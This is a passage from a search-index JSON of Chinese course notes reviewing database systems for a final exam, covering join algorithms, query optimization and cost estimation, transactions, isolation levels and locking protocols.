Join</p> </li> <li> <p>cost = \\(b_r(t_r+t_s)+n_r*c\\) c\u662f\u901a\u8fc7\u8fde\u63a5\u6761\u4ef6\u5bf9s\u8fdb\u884c\u5355\u6b21select\u7684\u4ee3\u4ef7</p> </li> <li>\u5982\u679cr\u548cs\u4e0a\u90fd\u6709\u7d22\u5f15\uff0c\u90a3\u4e48\u9700\u8981\u628a\u5143\u7ec4\u8f83\u5c11\u7684\u5173\u7cfb\u4f5c\u4e3a\u5916\u5c42</li> <li> <p>Merge join</p> </li> <li> <p>\u78c1\u76d8\u4f20\u8f93\u6b21\u6570 bs+br</p> </li> <li>\u78c1\u76d8\u5bfb\u5740\u6b21\u6570 \\(\\lceil br/bb\\rceil+\\lceil bs/bb\\rceil\\) \u6700\u574f\u60c5\u51b5\u5c31\u662fbr+bs</li> <li>\u548cmerge sort \u5f88\u50cf\uff0c\u6709\u4e00\u4e2a\u6bd4\u8f83\u7279\u6b8a\u7684\u5730\u65b9\u662f\uff0c\u5982\u679c\u4e24\u8fb9\u540c\u4e00\u4e2a\u503c\u90fd\u6709\u591a\u4e2a\uff0c\u6bd4\u5982A\u5904\u6709\u4e24\u4e2a\uff0cB\u5904\u6709\u4e09\u4e2a\uff0c\u5219\u9700\u8981\u505a6\u4e2a\u94fe\u63a5\uff0c\u5728\u8fd9\u79cd\u65f6\u5019\u9700\u8981\u4e00\u4e2a\u5c0f\u5faa\u73af</li> <li> <p>Hash Join</p> </li> <li> <p>\u4ec5\u4ec5\u7528\u4f5c\u7b49\u503c\u8fde\u63a5\u548c\u81ea\u7136\u8fde\u63a5\uff08\u5176\u5b9e\u5c31\u662f\u7279\u6b8a\u7b49\u503c\u8fde\u63a5\uff09</p> </li> <li>hash\u51fd\u6570\u7684\u53c2\u6570\u5c31\u662f\u7b49\u503c\u7684\u5c5e\u6027</li> <li>\u628ahash\u503c\u76f8\u540c\u7684\u653e\u5728\u4e00\u8d77</li> <li>hash\u7d22\u5f15\u7684key\u5c31\u662f\u8fde\u63a5\u7684\u7b49\u503c\u6761\u4ef6 hash function h is used to partition tuples of both relations with common JoinAttrs</li> <li>\u200b\u200b</li> <li>hash\u503c\u4e0d\u540c\u7684\uff0c\u4e00\u5b9a\u94fe\u63a5\u4e0d\u4e0a\uff0c\u5982\u679chash\u76f8\u540c\uff0c\u4e5f\u672a\u5fc5\u94fe\u63a5\u5f97\u4e0a\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u5728\u5185\u90e8\u505a\u4e24\u91cd\u5faa\u73af</li> <li>\u8981\u6c42\u662fhash\u7684\u5757\uff0c\u81f3\u5c11\u5c0f\u7684\u90a3\u4e2a\u80fd\u653e\u5230\u5185\u5b58\u91cc\uff0cn\u662fhash\u503c\u7684\u4e2a\u6570\uff0cM\u662f\u7f13\u51b2\u5757\u7684\u4e2a\u6570     \u200b\u200b</li> <li>hash join\u7684\u8fc7\u7a0b\uff0c\u5148partition\uff0c\u518djoin\uff0c\u6ce8\u610fpartition\u5e76\u975e\u540c\u65f6\u53d1\u751f\u7684</li> <li>\u200b\u200b</li> <li>\u5177\u4f53\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u5bf9\u4e8es\u8981\u5efa\u7acbin-memory hash index, \u8fd9\u4e2ahash\u51fd\u6570\u548c\u4e4b\u524d\u90a3\u4e2a\u4e0d\u540c\uff0c</li> <li>build input \u80fd\u653e\u5230\u5185\u5b58\u91cc</li> <li>probe input</li> <li> <p>recursive partition required if number of partition n is greater than number of page M of memory</p> </li> <li> <p>\u4e4b\u524d\u8bf4\u8d77\u7801\u8981\u6709\u4e00\u5757\u80fd\u653e\u5728\u5185\u5b58\u91cc\uff0c\u4e07\u4e00\u5c31\u662f\u653e\u4e0d\u4e0b\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u5bf9\u90a3\u4e9b\u8fc7\u5927\u7684block\u518d\u8fdb\u884c\u4e00\u4e2ahash partition</p> </li> <li>\u200b\u200b</li> <li>recursive partition\u7684\u754c\u9650</li> <li>\u200b\u200b</li> <li>\u200d</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#7-query-opimization","title":"7. Query Opimization","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#generating-equivalent-expression","title":"generating equivalent expression","text":"<p>\u4e00\u7cfb\u5217\u7b49\u4ef7\u539f\u5219</p> <p>\u200b\u200b</p> <p>\u5728\u6570\u636e\u5e93\u4e2d\u8fde\u63a5\u64cd\u4f5c\u662f\u6700\u5173\u952e\u7684\uff0c\u5982\u679c\u8fde\u63a5\u80fd\u540c\u65f6\u505a\u7b5b\u9009\u6700\u597d\u4e00\u8d77\u505a\u4e86</p> <ul> <li>\\(\\prod_{A}(\\prod_{AB}(r))=\\prod_{A}(r)\\) \u6210\u7acb</li> <li>\\(\\prod_{A}(\\prod_{B}(r))=\\prod_{A}(r)\\) \u4e0d\u6210\u7acb\uff0c\u603b\u4e4bB\u8981\u5305\u542bA</li> </ul> <p>\u200b\u200b</p> <p>Theta-join\u53ef\u4ee5\u4ea4\u6362\uff0c\u8bf4\u660enatural join\u662f\u53ef\u4ee5\u4ea4\u6362\uff0cnatural join\u4e5f\u662f\u53ef\u4ee5\u7ed3\u5408\u7684</p> <p>\u540e\u9762\u8fd8\u6709\u5f88\u591a\u8be6\u7ec6\u89c1PPT</p> <p>union and intersection</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#statistics-for-cost-estimation","title":"statistics for cost estimation* \u76f4\u65b9\u56fe","text":"<ul> <li>space requirements reduced by sharing common sub-expressions</li> <li>time requirements are reduced by not generating all expressions</li> </ul> <p>\u4e0b\u9762\u662f\u4e0ecost estimation\u76f8\u5173\u7684\u4e00\u4e9b\u5143\u7d20</p> <p>\u200b\u200b</p> <p>\u63a5\u4e0b\u6765\u662f\u6211\u4eec\u901a\u8fc7\u4e00\u4e9b\u989d\u5916\u7684\u4fe1\u606f\u6765\u8bc4\u4f30\u67e5\u8be2\u7684\u7ed3\u679c</p> <p>Histograms</p> <p>\u76f4\u65b9\u56fe</p> <p>\u200b\u200b</p> <p>\u53ef\u4ee5\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4f30\u7b97\uff0c\u89c1\u670b\u8f88*</p> <p>\u6839\u636e\u6700\u5927\u6700\u5c0f\u503cselect\u4f30\u8ba1</p> <ul> <li>\u5982\u679c\u662fkey \u5219\u7ed3\u679csize\u4e3a1\uff0c\u7b49\u4e8e\u67e5\u8be2</li> <li>\u200b\u200b</li> <li>\u5982\u679c\u5bf9\u4e8e\u590d\u5408\u7684\u67e5\u8be2\uff0cconjunction disjunction\u7b49</li> <li>\u200b\u200b</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#estimation-of-the-size-of-join","title":"estimation of the size of join","text":"<ul> <li>\u82e5\u4e3a\u7b80\u5355\u7684\u7b1b\u5361\u5c14\u79ef rxs \u7ed3\u679c\u5c31\u662f\u4e24\u4e2a\u5143\u7ec4\u6570\u76f8\u4e58 nr * ns</li> <li>\u82e5\u4e3a\\(R\\cap S=\\varnothing\\)\uff0c\u5219 \\(r \\Join s = r \\times s\\)</li> <li>\u82e5\\(R \\cap S\\) is a key for R, \\(r \\Join s \\le n_s\\)</li> <li>\u82e5\\(R\\cap S\\) is a foreign key in S referencing R\uff0c\\(r\\Join s = n_s\\) \u4e5f\u6709\u4e00\u4e2a\u524d\u63d0\u662fforeign key\u4e0d\u4e3a\u7a7a\uff0c\u5b9e\u9645\u4e0a\u5373\u4f7f\u5b58\u5728foreign key \u7ea6\u675f\u4e5f\u53ef\u4ee5\u4e3anull</li> <li>\u5982\u679c\u4e0d\u5b58\u5728key\u7ea6\u675f\uff0c\u90a3\u4e48\u4e00\u822c\u7ed3\u679c\u4e3a \\(\\min\\{ \\frac{n_r*n_s}{V(A,s)},\\frac{n_r*n_s}{V(A,r)} \\}\\)</li> </ul>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#estimation-of-number-of-distinct-value","title":"estimation of number of distinct value","text":"<p>\u6211\u4eec\u5728\u4e4b\u524d\u7528\u5230\u4e86\u5f88\u591a\u6b21 V(A,r) \uff0c\u6211\u4eec\u4e5f\u9700\u8981\u80fd\u591f\u4f30\u8ba1\u4e2d\u95f4\u7ed3\u679c\u7684V(A, r)\uff0c\u4ee5\u4fbf\u80fd\u591f\u540e\u7eed\u5904\u7406\u3002</p> <p>select\u7684V(A,r)\u4f30\u8ba1 \\(\\sigma_{\\theta}(r)\\) \u6c42 \\(V(A,\\sigma_{\\theta}(r))\\) </p> <ul> <li>\u82e5 \\(\\theta\\) \u7684\u7b5b\u9009\u662f\u4e00\u4e2a\u7279\u5b9a\u7684\u503c\uff0c\u90a3\u4e48V = 1</li> <li>\u5982\u679c\u7b5b\u9009\u662f\u4e00\u7cfb\u5217\u7279\u5b9a\u7684\u503c\uff0c\u90a3\u4e48\u5c31\u52a0\u8d77\u6765</li> <li>\u5982\u679c\u7b5b\u9009\u662f\u4e00\u4e2a\u8303\u56f4 V = V(A, r) * s s\u662fselectivity of the selection</li> <li>\u200b\u200b</li> </ul> <p>join \u7684\u4f30\u8ba1</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#size","title":"\u5176\u4ed6\u7684size\u4f30\u8ba1","text":"<p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#choice-of-evaluation-plan","title":"choice of evaluation plan","text":"<p>cost-based join-order selection</p> <p>\u5982\u679c\u6709r1-rn\u4e2a\u5173\u7cfb\u505anatural join</p> <p>\u200b\u200b</p> <p>\u5b9e\u9645\u7684\u505a\u6cd5\u662f\u91c7\u7528\u52a8\u6001\u89c4\u5212\u53bb\u4f18\u5316\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5148\u627e\u5230\u4e861-3\u7684\u6700\u4f18\u89e3\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u53ea\u8981\u628a1-3\u770b\u505a\u4e00\u4e2a\u6574\u4f53\uff0c\u548c4,5\uff0c\u53c8\u662f3\u4e2a\u5173\u7cfb\u7684\u6392\u5e8f\uff0c12+12</p> <p>\u200b\u200b</p> <p>\u5148\u5206\u89e3\u6210\u4e24\u4e2a\u5c0f\u7684\u96c6\u5408 \\(\ud835\udc46_1,\ud835\udc46\u2212\ud835\udc46_1.\\)\u9012\u5f52\u5730\u7ec6\u5206\u3002\u9012\u5f52\u5230\u6700\u5e95\u5c42\u5c31\u53d8\u4e3a\u4e86\u5bf9\u5355\u4e2a\u8868\u7684\u9009\u62e9\u65b9\u6cd5\u3002</p> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u5206\u6790\uff0c\u4f46\u5b9e\u9645\u53ef\u80fd\u4f1a\u91c7\u7528left-deep join tree\uff0c\u627e\u5230\u7684\u672a\u5fc5\u662f\u6700\u4f18\uff0c\u4f46\u662f\u80fd\u964d\u4f4e\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>\u200b\u200b</p> <p>heuristic optimization \u542f\u53d1\u5f0f\u4f18\u5316</p> <p>cost-based optimization \u5373\u4fbf\u662f\u4f7f\u7528\u4e86 dp\u4e5f\u4f9d\u65e7\u975e\u5e38expensive\uff0csystem\u6709\u65f6\u4f1a\u91c7\u7528\u542f\u53d1\u5f0f\u7684\u65b9\u6cd5reduce the number of choices that must be made in a cost-based fashion</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#additional-optimization-technique","title":"additional optimization technique","text":"<p>optimizing nested subquery</p> <p>\u200b\u200b</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u60f3\u6cd5\u662f\u5c06\u5176\u8f6c\u6362\u6210join\u64cd\u4f5c\uff0c\u56e0\u4e3a\u5faa\u73af\u7740\u6bcf\u6b21\u505a\u4e00\u6b21\u5b50\u67e5\u8be2\uff0c\u5f00\u9500\u4f1a\u975e\u5e38\u5927</p> <p>\u200b\u200b</p> <p>\u53ef\u4ee5\u4f7f\u7528semijoin\u64cd\u4f5c\u6765\u66ff\u4ee3exists\u7b49\u8fd0\u7b97</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_7","title":"\u6210\u672c\u4f30\u8ba1","text":"<p>\u4e2d\u95f4\u7ed3\u679c\u8981\u5c11</p> <p>cost-based query optimization</p> <ul> <li>generate logically equivalent expression \u5148\u7b5b\u9009</li> <li>Annotate resultant expression in alternative ways to get alternative query plan</li> <li>choose cheapest plan based on estimated cost</li> </ul> <p>\u53ef\u4ee5\u4f7f\u7528explain \u8ba9\u6570\u636e\u5e93\u5f15\u64ce\u6765\u89e3\u91caquery plan <p>\u8bc4\u4f30\u6267\u884c\u8ba1\u5212\u7684cost</p> <p>\u8d8a\u5c0f\u8d8a\u7cbe\u786e</p> <p>\u4f30\u8ba1distinct values</p> <p>\u9009\u62e9\u6210\u672c</p> <ul> <li>A=v\u7b49\u4ef7\u9009\u62e9\uff0c\u82e5\u53d6\u503c\u662f\u5747\u5300\u5206\u5e03\u7684\uff0c\u5982\u6709\u4e00\u4e2a\u76f4\u65b9\u56fe\uff0c\u53ef\u4ee5\u7528n/V\uff0cn\u4e3a\u8be5\u533a\u57df\u5185\u5143\u7ec4\u4e2a\u6570\uff0cV\u662f\u8be5\u533a\u57df\u5185\u503c\u7684\u4e2a\u6570</li> <li>A&lt;=v \u200b</li> </ul> <p>\u5bf9\u4e8e\u590d\u6742\u7684\u9009\u62e9</p> <p>\u200b\u200b</p> <p>s1\u5c31\u662f\u6307\u6ee1\u8db3\\(\\theta1\\)\u7684\u8bb0\u5f55\u4e2a\u6570</p> <p>\u8fde\u63a5\u6210\u672c</p> <p>\u200b\u200b</p> <p>V(A, r) \u8868\u793a\u5173\u7cfbr\u7684A\u5c5e\u6027\u4e0a\u591a\u5c11\u79cd\u4e0d\u540c\u7684A</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#heuristic","title":"\u4f18\u5316\u7684\u542f\u53d1\u6027\u601d\u8defHeuristic","text":"<p>\u9009\u62e9\u4f18\u5148\u7b49\u7b49</p> <p>\u9009\u62e9\u7b97\u5b50\u7684\u6392\u5e8f</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#8-transaction","title":"8. transaction","text":"<p>ACID</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_8","title":"\u4e8b\u52a1\u9694\u79bb\u6027","text":"<p>\u5c31\u662f\u8981\u8ba9\u4e8b\u52a1\u8868\u73b0\u5f97\u50cf\u662f\u4e32\u884c\u7684\u4e00\u6837</p> <ul> <li> <p>\u53ef\u4e32\u884c\u5316</p> </li> <li> <p>\u51b2\u7a81\u53ef\u4e32\u884c\u5316 \u82e5\u4e00\u4e2a\u8c03\u5ea6\u548c\u4e00\u4e2a\u4e32\u884c\u8c03\u5ea6\u51b2\u7a81\u7b49\u4ef7\uff0c\u5219\u8bf4\u660e\u5176\u662f\u51b2\u7a81\u53ef\u4e32\u884c\u5316\u7684</p> </li> <li>\u51b2\u7a81\uff0c\u662f\u6307\u6307\u5411\u4e00\u4e2a\u5143\u7d20\u7684\u4e24\u4e2a\u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u81f3\u5c11\u4e00\u4e2a\u662f\u5199</li> <li>\u51b2\u7a81\u7b49\u4ef7 conflict equivalent\uff0c\u662f\u6307\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ea4\u6362\u4e00\u7cfb\u5217\u975e\u51b2\u7a81\u6307\u4ee4\u6765\u8f6c\u6362\u4e24\u4e2a\u8c03\u5ea6\uff0c\u5219\u79f0\u4e24\u4e2a\u8c03\u5ea6\u51b2\u7a81\u7b49\u4ef7</li> <li>\u4f18\u5148\u56fe precedence graph \\(T_i\\rightarrow T_j\\) \u662f\u6307Ti\u5728Tj\u4e4b\u524d</li> <li>\u5728\u4f18\u5148\u56fe\u4e2d\uff0cserializability order \u53ef\u4ee5\u901a\u8fc7topological sorting\u83b7\u5f97</li> <li>view serializability</li> </ul> <p>\u4e8b\u52a1\u9694\u79bb\u6027+\u539f\u5b50\u6027</p> <p>\u53ef\u6062\u590d\u8c03\u5ea6 recoverable schedule\uff0c\u6765\u770b\u8fd9\u4e48\u4e00\u4e2a\u8c03\u5ea6</p> <p>\u200b\u200b</p> <p>\u82e5T7\u63d0\u4ea4\u4e4b\u540e\uff0cT6\u53d1\u751f\u4e86\u6545\u969c\uff0c\u663e\u7136\u4fdd\u6301\u539f\u5b50\u6027\uff0cwriteA\u9700\u8981\u88ab\u56de\u6eda\uff0c\u56e0\u6b64\u6b64\u65f6T7\u7684read\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u9519\u8bef\u7ed3\u679c\uff0c\u4f46\u662f\u6b64\u65f6T6\u5df2\u7ecf\u63d0\u4ea4\u4e86\uff0c\u4e0d\u80fd\u88ab\u7ea7\u8054\u56de\u6eda\uff0c\u56e0\u6b64\u6b64\u65f6\uff0c\u8fd9\u4e2a\u8c03\u5ea6\u662f\u4e00\u4e2a\u4e0d\u53ef\u6062\u590d\u8c03\u5ea6</p> <p>\u65e0\u7ea7\u8054\u8c03\u5ea6</p> <p>\u9996\u5148\u65e0\u7ea7\u8054\u8c03\u5ea6\u672c\u8eab\u662f\u4e00\u4e2a\u53ef\u6062\u590d\u8c03\u5ea6\uff0c\u5e76\u4e14\u7531\u4e8e\u4e8b\u52a1\u53d1\u751f\u6545\u969c\u5bfc\u81f4\u7684\u5f88\u591a\u4e8b\u52a1\u53d1\u751f\u56de\u6eda\uff0c\u8be5\u73b0\u8c61\u6210\u4e3acascading rollback \u7ea7\u8054\u56de\u6eda</p> <p>\u80fd\u591f\u907f\u514dcascading rollback\u7684\u8c03\u5ea6\u662fcascadeless schedule</p> <p>\u56db\u79cdSQL\u6807\u51c6\u7684\u9694\u79bb\u7ea7\u522b</p> <p>\u7edf\u8ba1\u4fe1\u606f\u7684\u65f6\u5019\u4e0d\u4e00\u5b9a\u9700\u8981\u7cbe\u786e</p> <ul> <li>Serializable \u6700\u9ad8\u9694\u79bb</li> <li>Repeatable read\uff0c\u80fd\u627e\u5230\u4e00\u4e9brecords\uff0c\u4f46\u65e0\u6cd5\u627e\u5230\u5176\u4ed6\u7684\u8bb0\u5f55\u3002\u975eSerializable</li> <li>read committed</li> <li>read uncommitted \u6700\u4f4e\u9694\u79bb</li> </ul>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#9-concurrency-control","title":"9. concurrency control","text":"<p>\u7ef4\u62a4\u9694\u79bb\u6027\u548c\u4e00\u81f4\u6027\uff1f</p> <p>\u4e24\u9636\u6bb5\u9501\u5e76\u975e\u662f\u4e00\u4e2a\u5fc5\u8981\u6761\u4ef6\uff0c\u800c\u53ea\u662f\u5145\u5206\u6761\u4ef6</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#91","title":"9.1 \u57fa\u4e8e\u9501\u7684\u534f\u8bae","text":"<p>\u4e8b\u52a1\u9501\u7684\u8bf7\u6c42\u7684\u997f\u6b7b(starved)\uff0c\u662f\u6307\u6709\u4e00\u5806\u7684\u4e8b\u52a1\u5411\u6570\u636e\u52a0\u5171\u4eab\u9501\uff0c\u4ee5\u81f3\u4e8e\u6392\u4ed6\u9501\u7684\u8bf7\u6c42\u4e00\u76f4\u7b49\u5f85\u4e0d\u5230</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u901a\u8fc7\u8bbe\u8ba1\u5148\u540e\u6761\u4ef6\uff0c\u4f7f\u5176\u4e0d\u88ab\u5176\u540e\u7684\u52a0\u9501\u8bf7\u6c42\u963b\u585e</p> <p>\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae</p> <p>\u53ea\u8981\u6839\u636elock-point\u6392\u5e8f\uff0c\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae\u53ef\u4ee5\u786e\u4fddSerializablility</p> <p>\u8bc1\u660e</p> <ul> <li>\u53cd\u8bc1</li> <li>\u6b63\u5411\uff1a\u901a\u8fc7\u4ea4\u6362\u64cd\u4f5c\uff0c\u53ef\u4ee5\u628alock point\u65e9\u7684\u64cd\u4f5c\u5168\u90e8\u4ea4\u6362\u5230\u6700\u65e9</li> </ul> <p>\u533a\u5206\u589e\u957f\u9636\u6bb5\u548c\u7f29\u51cf\u9636\u6bb5</p> <ul> <li>strict two-phase locking protocol \u4e8b\u52a1\u7684\u6392\u4ed6\u9501\u5728\u4e8b\u52a1\u63d0\u4ea4\u4e4b\u540e\u624d\u80fd\u91ca\u653e\uff0c\u53ef\u4ee5\u907f\u514d\u7ea7\u8054\u56de\u6eda</li> <li>rigorous two-phase locking protocol \u4e8b\u52a1\u5728\u63d0\u4ea4\u4e4b\u524d\u4e0d\u53ef\u91ca\u653e\u4efb\u4f55\u9501</li> </ul> <p>\u5982\u4f55\u5224\u65ad\u8fd9\u4e2a\u8c03\u5ea6\u662f\u5426\u7531\u4e24\u9636\u6bb5\u534f\u8bae\u4ea7\u751f\uff0c\u662f\u6839\u636e\u4e8b\u52a1\u52a0\u9501\u7684\u72b6\u6001\u6765\u7684</p> <p>\u200b\u200b</p> <p>\u5982\u4e0a\u56fe\u662f\u4e00\u4e2a\u53ef\u4e32\u884c\u5316\u7684\uff0c\u975e\u4e24\u9636\u6bb5\u7684\u8c03\u5ea6</p> <p>\u975e\u4e24\u9636\u6bb5\u534f\u8bae</p> <ul> <li>\u56fe\u7684\u534f\u8bae</li> </ul> <p>\u6b7b\u9501\u5904\u7406</p> <ul> <li>\u6b7b\u9501\u9884\u9632</li> <li> <p>\u6b7b\u9501\u68c0\u6d4b+\u6062\u590d \u753b\u56fe\uff0c\u68c0\u6d4b\uff0c\u9009\u62e9\u4e00\u4e2a\u727a\u7272\u7684\u4e8b\u52a1\uff0c\u6062\u590d</p> </li> <li> <p>total rollback</p> </li> <li>partial rollback</li> </ul> <p>\u9501\u534f\u8bae\u7684\u7f3a\u9677</p> <p>\u6b7b\u9501</p> <p>\u200b\u200b</p> <p>lock conversion</p> <ul> <li>lock-upgrade</li> <li>lock-downgrade</li> </ul> <p>lock table</p> <p>\u96c6\u4e2d\u7ba1\u7406\u9501\u7684manager\uff0c\u9700\u8981\u4e00\u4e2ahash table\uff0c\u5c06\u4e00\u4e2a\u6570\u636e\u552f\u4e00\u6807\u8bc6\u6620\u5c04\u5230\u4e00\u4e2a\u5730\u65b9</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#92-graph-based-protocol","title":"9.2 Graph-based Protocol","text":"<p>\u5982\u679c\u6211\u4eec\u5bf9\u6570\u636e\u7684\u7ed3\u6784\u6ca1\u6709\u4e86\u89e3\uff0c\u90a3\u4e48\u4e24\u9636\u6bb5\u534f\u8bae\u662f\u5408\u9002\u7684\uff0c\u5982\u679c\u6211\u4eec\u5bf9\u6570\u636e\u5b58\u5728\u4e00\u5b9a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u53ef\u4ee5\u6839\u636e\u5176\u7ed3\u6784\uff0c\u4f7f\u7528\u66f4\u9ad8\u7ea7\u7684\u534f\u8bae\uff0c\u6bd4\u5982\u5982\u679c\u6570\u636e\u6ee1\u8db3\u504f\u5e8f\u5173\u7cfb</p> <p>\u200b\u200b</p> <p>\u6bd4\u5982\u6211\u4eec\u9700\u8981\u8bbf\u95eeB\uff0c\u5fc5\u987b\u8981\u8bbf\u95eeA</p> <p>\u5728\u8fd9\u91cc\u6211\u4eec\u8bb2\u89e3\u6700\u7b80\u5355\u7684tree protocol\u7b97\u662f\u56fe\u534f\u8bae\u7684\u4e00\u79cd\u7279\u5316</p> <p>\u200b\u200b</p> <ul> <li>\u53ea\u6709\u6392\u4ed6\u9501</li> <li>\u7b2c\u4e00\u4e2a\u9501\u53ef\u4ee5\u52a0\u8f7d\u4efb\u4f55\u5730\u65b9\uff0c\u4e0d\u9700\u8981\u4eceroot\u5f00\u59cb\uff1b\u540e\u7eed\u7684\u9501\uff0c\u5fc5\u987b\u8981\u4e89\u7236\u8282\u70b9\u9501\u4e0a</li> <li>\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u89e3\u9501</li> <li>\u6bcf\u4e2a\u6570\u636e\u5bf9\u4e00\u4e2a\u4e8b\u7269\u4ec5\u80fd\u9501\u4e00\u6b21</li> </ul> <p>\u4f18\u70b9</p> <ul> <li>\u53ef\u4ee5\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u9ad8\u5e76\u53d1\u5ea6\uff0c\u56e0\u4e3a\u53ef\u4ee5\u968f\u65f6\u91ca\u653e</li> <li>\u4fdd\u8bc1\u4e32\u884c\uff0c\u907f\u514d\u6b7b\u9501</li> </ul> <p>\u7f3a\u9677</p> <ul> <li>\u4e5f\u6709\u4e00\u4e9b\u7f3a\u9677\uff0c\u6bd4\u5982\u6211\u60f3\u8bbf\u95eeG\uff0cJ\uff0c\u6211\u5c31\u5fc5\u987b\u9501\u4e0a\u5b83\u4eec\u7684\u516c\u5171\u7956\u5148D\uff0c\u867d\u7136\u6211\u4eec\u53ef\u80fd\u5e76\u4e0d\u9700\u8981\u8bbf\u95eeD\u548cH</li> <li>\u4e0d\u4fdd\u8bc1\u53ef\u6062\u590d\u6027\uff0c\u53ef\u6062\u590d\u6027\u7684\u5173\u952e\u5728\u4e8e\u4e0d\u8bfb\u810f\u6570\u636e</li> </ul>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#93-granularity","title":"9.3 